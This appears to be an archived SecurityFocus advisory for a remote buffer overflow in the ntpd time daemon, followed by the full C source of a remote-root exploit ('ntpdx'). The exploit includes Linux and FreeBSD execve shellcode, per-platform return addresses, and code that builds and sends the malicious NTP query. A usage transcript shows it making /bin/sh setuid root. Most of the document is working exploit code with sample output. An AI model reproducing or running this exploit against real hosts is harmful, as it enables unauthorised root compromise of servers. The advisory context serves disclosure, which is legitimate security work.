source: http://www.securityfocus.com/bid/2540/info

NTP, the Network Time Protocol, is used to synchronize the time between a computer and another system or time reference. It uses UDP as a transport protocol. There are two protocol versions in use: NTP v3 and NTP v4. The 'ntpd' daemon implementing version 3 is called 'xntp3'; the version implementing version 4 is called 'ntp'.

On UNIX systems, the 'ntpd' daemon is available to regularly synchronize system time with internet time servers.

Many versions of 'ntpd' are prone to a remotely exploitable buffer-overflow issue. A remote attacker may be able to crash the daemon or execute arbitrary code on the host.

If successful, the attacker may gain root access on the victim host or may denial NTP service on the affected host. 

/* ntpd remote root exploit / babcia padlina ltd. <venglin@freebsd.lublin.pl> */

/*
 * Network Time Protocol Daemon (ntpd) shipped with many systems is vulnerable
 * to remote buffer overflow attack. It occurs when building response for
 * a query with large readvar argument. In almost all cases, ntpd is running
 * with superuser privileges, allowing to gain REMOTE ROOT ACCESS to timeserver.
 *
 * Althought it's a normal buffer overflow, exploiting it is much harder.
 * Destination buffer is accidentally damaged, when attack is performed, so
 * shellcode can't be larger than approx. 70 bytes. This proof of concept code
 * uses small execve() shellcode to run /tmp/sh binary. Full remote attack
 * is possible.
 *
 * NTP is stateless UDP based protocol, so all malicious queries can be
 * spoofed.
 *
 * Example of use on generic RedHat 7.0 box:
 *
 * [venglin@cipsko venglin]$ cat dupa.c
 * main() { setreuid(0,0); system("chmod 4755 /bin/sh");  }
 * [venglin@cipsko venglin]$ cc -o /tmp/sh dupa.c
 * [venglin@cipsko venglin]$ cc -o ntpdx ntpdx.c
 * [venglin@cipsko venglin]$ ./ntpdx -t2 localhost
 * ntpdx v1.0 by venglin@freebsd.lublin.pl
 * 
 * Selected platform: RedHat Linux 7.0 with ntpd 4.0.99k-RPM (/tmp/sh)
 *
 * RET: 0xbffff777 / Align: 240 / Sh-align: 160 / sending query
 * [1] <- evil query (pkt = 512 | shell = 45)
 * [2] <- null query (pkt = 12)
 * Done.
 * /tmp/sh was spawned.
 * [venglin@cipsko venglin]$ ls -al /bin/bash
 * -rwsr-xr-x    1 root     root       512540 Aug 22  2000 /bin/bash
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>

#define NOP	0x90
#define ADDRS	8
#define PKTSIZ	512

static char usage[] = "usage: ntpdx [-o offset] <-t type> <hostname>";

/* generic execve() shellcodes */

char lin_execve[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/tmp/sh";

char bsd_execve[] =
        "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
        "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
        "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/tmp/sh\x01\x01\x01\x01"
        "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

struct platforms
{
	char *os;
	char *version;
	char *code;
	long ret;
	int align;
	int shalign;
	int port;
};

/* Platforms. Notice, that on FreeBSD shellcode must be placed in packet 
 * *after* RET address. This values will vary from platform to platform.
 */

struct platforms targ[] =
{
	{ "FreeBSD 4.2-STABLE", "4.0.99k (/tmp/sh)", bsd_execve,
		0xbfbff8bc, 200, 220, 0 },

	{ "FreeBSD 4.2-STABLE", "4.0.99k (/tmp/sh)", bsd_execve,
		0xbfbff540, 200, 220, 0 },

	{ "RedHat Linux 7.0", "4.0.99k-RPM (/tmp/sh)", lin_execve,
		0xbffff777, 240, 160, 0 },

	{ NULL, NULL, NULL, 0x0, 0, 0, 0 }
};

long getip(name)
char *name;
{
	struct hostent *hp;
	long ip;
	extern int h_errno;

	if ((ip = inet_addr(name)) < 0)
	{
		if (!(hp = gethostbyname(name)))
		{
			fprintf(stderr, "gethostbyname(): %s\n",
				strerror(h_errno));
			exit(1);
		}
		memcpy(&ip, (hp->h_addr), 4);
	}

	return ip;
}

int doquery(host, ret, shellcode, align, shalign)
char *host, *shellcode;
long ret;
int align, shalign;
{
	/* tcpdump-based reverse engineering :)) */

	char q2[] = { 0x16, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		      0x00, 0x00, 0x01, 0x36, 0x73, 0x74, 0x72, 0x61,
		      0x74, 0x75, 0x6d, 0x3d };

	char q3[] = { 0x16, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
		      0x00, 0x00, 0x00, 0x00 };

	char buf[PKTSIZ], *p;
	long *ap;
	int i;

	int sockfd;
	struct sockaddr_in sa;

	bzero(&sa, sizeof(sa));

	sa.sin_family = AF_INET;
	sa.sin_port = htons(123);
	sa.sin_addr.s_addr = getip(host);

	if((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
		perror("socket");
		return -1;
	}

	if((connect(sockfd, (struct sockaddr *)&sa, sizeof(sa))) < 0)
	{
		perror("connect");
		close(sockfd);
		return -1;
	}

	memset(buf, NOP, PKTSIZ);
	memcpy(buf, q2, sizeof(q2));

	p = buf + align;
	ap = (unsigned long *)p;
                
	for(i=0;i<ADDRS/4;i++)
		*ap++ = ret;

	p = (char *)ap;

	memcpy(buf+shalign, shellcode, strlen(shellcode));

	if((write(sockfd, buf, PKTSIZ)) < 0)
	{
		perror("write");
		close(sockfd);
		return -1;
	}

	fprintf(stderr, "[1] <- evil query (pkt = %d | shell = %d)\n", PKTSIZ,
		strlen(shellcode));
	fflush(stderr);

        if ((write(sockfd, q3, sizeof(q3))) < 0)
        {
                perror("write");
                close(sockfd);
                return -1;
        }

	fprintf(stderr, "[2] <- null query (pkt = %d)\n", sizeof(q3));
	fflush(stderr);

	close(sockfd);

	return 0;
}

int main(argc, argv)
int argc;
char **argv;
{
	extern int optind, opterr;
	extern char *optarg;
	int ch, type, ofs, i;
	long ret;

	opterr = ofs = 0;
	type = -1;

	while ((ch = getopt(argc, argv, "t:o:")) != -1)
		switch((char)ch)
		{
			case 't':
				type = atoi(optarg);
				break;

			case 'o':
				ofs = atoi(optarg);
				break;

			case '?':
			default:
				puts(usage);
				exit(0);

		}

	argc -= optind;
	argv += optind;

	fprintf(stderr, "ntpdx v1.0 by venglin@freebsd.lublin.pl\n\n");

	if (type < 0)
	{
		fprintf(stderr, "Please select platform:\n");
		for (i=0;targ[i].os;i++)
		{
			fprintf(stderr, "\t-t %d : %s %s (%p)\n", i,
			targ[i].os, targ[i].version, (void *)targ[i].ret);
		}

		exit(0);
	}

	fprintf(stderr, "Selected platform: %s with ntpd %s\n\n",
			targ[type].os, targ[type].version);

	ret = targ[type].ret;
	ret += ofs;

	if (argc != 1)
	{
		puts(usage);
		exit(0);
	}

	fprintf(stderr, "RET: %p / Align: %d / Sh-align: %d / sending query\n",
		(void *)ret, targ[type].align, targ[type].shalign);

	if (doquery(*argv, ret, targ[type].code, targ[type].align,
		targ[type].shalign) < 0)
	{
		fprintf(stderr, "Failed.\n");
		exit(1);
	}

	fprintf(stderr, "Done.\n");

	if (!targ[type].port)
	{
		fprintf(stderr, "/tmp/sh was spawned.\n");
		exit(0);
	}

	exit(0);
}
